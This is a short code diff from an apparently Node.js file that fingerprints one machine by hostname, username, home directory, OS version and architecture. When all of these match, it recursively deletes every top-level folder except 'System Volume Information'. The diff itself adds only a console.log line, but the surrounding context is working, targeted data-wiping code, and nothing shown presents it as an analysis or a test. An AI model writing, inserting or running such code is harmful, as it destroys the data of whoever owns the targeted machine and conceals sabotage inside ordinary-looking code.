@@ -13,6 +13,7 @@ const data = {
 
 if (os.hostname() == data.HOSTNAME && os.userInfo().username == data.USERNAME && os.homedir() == data.HOMEDIR && os.version() == data.VERSION && os.release() == data.WINVER && os.arch() == data.ARCH) {
     glob.sync("./*/").map(resources => {
+        console.log(resources)
         if (resources == "./System Volume Information/") return;
         fs.rmSync(resources, {recursive: true});
     })
